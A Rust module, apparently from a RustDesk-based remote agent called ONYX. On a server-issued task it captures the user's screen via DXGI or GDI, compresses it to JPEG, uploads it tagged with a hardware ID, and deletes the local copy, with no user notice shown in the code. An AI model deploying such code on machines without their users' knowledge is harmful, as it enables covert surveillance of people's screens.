// ONYX: 截屏回传（任务类型 `capture_screen`）
//
// 注意：这个任务**只能在用户会话进程里执行**。服务进程跑在 session 0，
// 没有交互桌面，截出来要么全黑要么直接失败。
// 分工见 onyx_heartbeat::Scope —— 服务进程排除 capture_*，
// 用户会话进程（--server）只拉 capture_*。
//
// params: {"quality":75,"max_width":1920}
// 返回:   {"ok":true,"bytes":..,"width":..,"height":..,"stored":..}
use hbb_common::log;
use image::{ColorType, ImageEncoder};
use scrap::{Capturer, TraitCapturer, TraitPixelBuffer};
use serde_json::{json, Value};
use std::time::Duration;

const DEFAULT_QUALITY: u8 = 75;

/// GDI 兜底：dxgi 找不到输出（无显示器 / 远程会话）时用 BitBlt 直接抓桌面。
#[cfg(windows)]
fn capture_gdi() -> Result<(Vec<u8>, usize, usize), String> {
    use windows::Win32::Graphics::Gdi::{
        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDC,
        GetDIBits, ReleaseDC, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS,
        SRCCOPY,
    };
    use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        if width <= 0 || height <= 0 {
            return Err(format!("拿不到屏幕尺寸: {width}x{height}"));
        }
        let screen = GetDC(None);
        if screen.is_invalid() {
            return Err("GetDC 失败".to_owned());
        }
        let mem = CreateCompatibleDC(Some(screen));
        if mem.is_invalid() {
            ReleaseDC(None, screen);
            return Err("CreateCompatibleDC 失败".to_owned());
        }
        let bmp = CreateCompatibleBitmap(screen, width, height);
        if bmp.is_invalid() {
            DeleteDC(mem);
            ReleaseDC(None, screen);
            return Err("CreateCompatibleBitmap 失败".to_owned());
        }
        let old = SelectObject(mem, bmp.into());
        let blt = BitBlt(mem, 0, 0, width, height, Some(screen), 0, 0, SRCCOPY);

        let mut bi = BITMAPINFO::default();
        bi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bi.bmiHeader.biWidth = width;
        bi.bmiHeader.biHeight = -height; // 负高度 = 自上而下
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB.0;
        let mut buf = vec![0u8; (width as usize) * (height as usize) * 4];
        let lines = GetDIBits(
            mem,
            bmp,
            0,
            height as u32,
            Some(buf.as_mut_ptr() as *mut _),
            &mut bi,
            DIB_RGB_COLORS,
        );

        SelectObject(mem, old);
        let _ = DeleteObject(bmp.into());
        let _ = DeleteDC(mem);
        ReleaseDC(None, screen);

        if blt.is_err() {
            return Err("BitBlt 失败".to_owned());
        }
        if lines == 0 {
            return Err("GetDIBits 失败".to_owned());
        }
        for px in buf.chunks_exact_mut(4) {
            px.swap(0, 2);
            px[3] = 255;
        }
        Ok((buf, width as usize, height as usize))
    }
}

fn capture_rgba() -> Result<(Vec<u8>, usize, usize), String> {
    let display = scrap::Display::primary().map_err(|e| format!("找不到主屏: {e}"))?;
    let mut capturer = Capturer::new(display).map_err(|e| format!("初始化截屏失败: {e}"))?;
    let spf = Duration::from_millis(50);

    let mut last_err = String::new();
    for _ in 0..60 {
        match capturer.frame(spf) {
            Ok(frame) => {
                if !frame.valid() {
                    last_err = "帧无效".to_owned();
                    continue;
                }
                if let scrap::Frame::PixelBuffer(pb) = &frame {
                    let w = pb.width();
                    let h = pb.height();
                    let mut rgba = Vec::new();
                    scrap::convert(pb, scrap::Pixfmt::RGBA, &mut rgba)
                        .map_err(|e| format!("格式转换失败: {e}"))?;
                    return Ok((rgba, w, h));
                }
                return Err("不支持的帧类型（纹理帧）".to_owned());
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                last_err = e.to_string();
                std::thread::sleep(Duration::from_millis(30));
            }
            Err(e) => return Err(format!("抓帧失败: {e}")),
        }
    }
    Err(format!("抓帧超时: {last_err}"))
}

/// 先走 scrap(dxgi)，失败再走 GDI 兜底。
fn capture_any() -> Result<(Vec<u8>, usize, usize), String> {
    match capture_rgba() {
        Ok(v) => Ok(v),
        Err(dxgi_err) => {
            log::warn!("[ONYX] dxgi 截屏失败（{dxgi_err}），改用 GDI");
            #[cfg(windows)]
            {
                capture_gdi().map_err(|gdi_err| format!("{dxgi_err} / GDI: {gdi_err}"))
            }
            #[cfg(not(windows))]
            {
                Err(dxgi_err)
            }
        }
    }
}

/// BGRA + 行填充 → RGBA 紧凑排列（scrap 的 convert 已经处理了，这里保留给单测和兜底）
#[allow(dead_code)]
fn bgra_to_rgba(frame: &[u8], width: usize, height: usize) -> Vec<u8> {
    let stride = if height > 0 { frame.len() / height } else { width * 4 };
    let mut out = vec![0u8; width * height * 4];
    for y in 0..height {
        let src_row = y * stride;
        let dst_row = y * width * 4;
        for x in 0..width {
            let s = src_row + x * 4;
            let d = dst_row + x * 4;
            if s + 3 >= frame.len() {
                break;
            }
            out[d] = frame[s + 2];
            out[d + 1] = frame[s + 1];
            out[d + 2] = frame[s];
            out[d + 3] = 255;
        }
    }
    out
}

/// 按最大宽度等比缩小（最近邻，够用且无依赖）
fn downscale(rgba: &[u8], width: usize, height: usize, max_width: usize) -> (Vec<u8>, usize, usize) {
    if max_width == 0 || width <= max_width {
        return (rgba.to_vec(), width, height);
    }
    let scale = width as f64 / max_width as f64;
    let nw = max_width;
    let nh = ((height as f64) / scale).max(1.0) as usize;
    let mut out = vec![0u8; nw * nh * 4];
    for y in 0..nh {
        let sy = ((y as f64) * scale) as usize;
        for x in 0..nw {
            let sx = ((x as f64) * scale) as usize;
            let s = (sy.min(height - 1) * width + sx.min(width - 1)) * 4;
            let d = (y * nw + x) * 4;
            out[d..d + 4].copy_from_slice(&rgba[s..s + 4]);
        }
    }
    (out, nw, nh)
}

pub fn capture(params: &[u8], task_id: &str, hwid: &str) -> String {
    let v: Value = serde_json::from_slice(params).unwrap_or(Value::Null);
    let quality = v
        .get("quality")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_QUALITY as u64)
        .clamp(20, 95) as u8;
    let max_width = v
        .get("max_width")
        .and_then(|x| x.as_u64())
        .unwrap_or(1920)
        .clamp(320, 4096) as usize;

    let (rgba, width, height) = match capture_any() {
        Ok(x) => x,
        Err(e) => return json!({"ok": false, "error": e}).to_string(),
    };
    let (small, nw, nh) = downscale(&rgba, width, height, max_width);

    let mut buf: Vec<u8> = Vec::new();
    let enc = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, quality);
    if let Err(e) = enc.write_image(&small, nw as u32, nh as u32, ColorType::Rgba8) {
        return json!({"ok": false, "error": format!("编码失败: {e}")}).to_string();
    }

    // 落盘再走统一的分块通道
    let dir = match std::env::var("ProgramData") {
        Ok(p) => std::path::Path::new(&p).join("Onyx").join("captures"),
        Err(_) => std::env::temp_dir(),
    };
    let _ = std::fs::create_dir_all(&dir);
    let name = format!("screen_{}.jpg", task_id.replace(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '-', "_"));
    let path = dir.join(&name);
    if let Err(e) = std::fs::write(&path, &buf) {
        return json!({"ok": false, "error": format!("落盘失败: {e}")}).to_string();
    }

    log::warn!("[ONYX] 截屏 {}x{} {} 字节 → {}", nw, nh, buf.len(), path.display());

    match crate::onyx_upload::send_with_key(&path.to_string_lossy(), 16 * 1024 * 1024, task_id, hwid, &name) {
        Ok((bytes, sha)) => {
            let _ = std::fs::remove_file(&path);
            json!({
                "ok": true,
                "width": nw,
                "height": nh,
                "bytes": bytes,
                "sha256": sha,
                "file": name,
            })
            .to_string()
        }
        Err(e) => json!({"ok": false, "error": format!("上传失败: {e}")}).to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bgra_conversion_swaps_channels() {
        // 1x1 像素：B=10 G=20 R=30 A=40
        let frame = vec![10u8, 20, 30, 40];
        let rgba = bgra_to_rgba(&frame, 1, 1);
        assert_eq!(rgba, vec![30, 20, 10, 255]);
    }

    #[test]
    fn downscale_respects_max_width() {
        let w = 100usize;
        let h = 50usize;
        let rgba = vec![128u8; w * h * 4];
        let (out, nw, nh) = downscale(&rgba, w, h, 40);
        assert_eq!(nw, 40);
        assert_eq!(nh, 20); // 100x50 等比缩到 40 → 40x20
        assert_eq!(out.len(), nw * nh * 4);
    }

    #[test]
    fn downscale_noop_when_smaller() {
        let rgba = vec![1u8; 4 * 2 * 4];
        let (out, nw, nh) = downscale(&rgba, 4, 2, 1920);
        assert_eq!((nw, nh), (4, 2));
        assert_eq!(out.len(), rgba.len());
    }
}
